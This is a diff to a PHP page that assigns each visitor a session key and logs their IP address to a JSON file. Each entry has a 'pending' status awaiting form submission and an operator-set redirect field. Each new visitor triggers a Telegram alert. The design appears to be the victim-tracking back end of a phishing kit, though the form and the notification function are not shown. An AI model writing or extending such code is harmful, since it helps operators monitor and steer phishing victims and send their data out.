@@ -1,11 +1,50 @@
 <?php
 session_start();
-// Generate unique user ID for this session
-if (!isset($_SESSION['user_id'])) {
-    $_SESSION['user_id'] = 'user_' . time() . '_' . bin2hex(random_bytes(4));
+// Generate unique user key on first visit
+if (!isset($_SESSION['user_key'])) {
+    $random_string = bin2hex(random_bytes(8)); // 16 chars
+    $timestamp = time();
+    $_SESSION['user_key'] = 'user_' . $timestamp . '_' . $random_string;
 }
-$user_id = $_SESSION['user_id'];
+
+$user_key = $_SESSION['user_key'];
+
+// Initialize user in database if not exists
+$users_file = 'data/users.db';
+$users = file_exists($users_file) ? json_decode(file_get_contents($users_file), true) : [];
+
+if (!isset($users[$user_key])) {
+    // Get user IP
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    
+    // Create new user entry
+    $users[$user_key] = [
+        'id' => $user_key,
+        'ip' => $ip,
+        'data' => [],
+        'status' => 'pending', // New status: waiting for form submission
+        'current_page' => 'index.php',
+        'redirect_to' => '',
+        'created_at' => time(),
+        'last_seen' => time(),
+        'last_updated' => time(),
+        'visits' => 1,
+        'history' => [
+            [
+                'time' => time(),
+                'action' => 'first_visit',
+                'page' => 'index.php'
+            ]
+        ]
+    ];
+    
+    file_put_contents($users_file, json_encode($users, JSON_PRETTY_PRINT));
+    
+    // Send Telegram notification
+    sendTelegramNotification($users[$user_key], 'New Visitor');
+}
 ?>
+
 <!DOCTYPE html>
 <html lang="en" translate="no">
 <head>
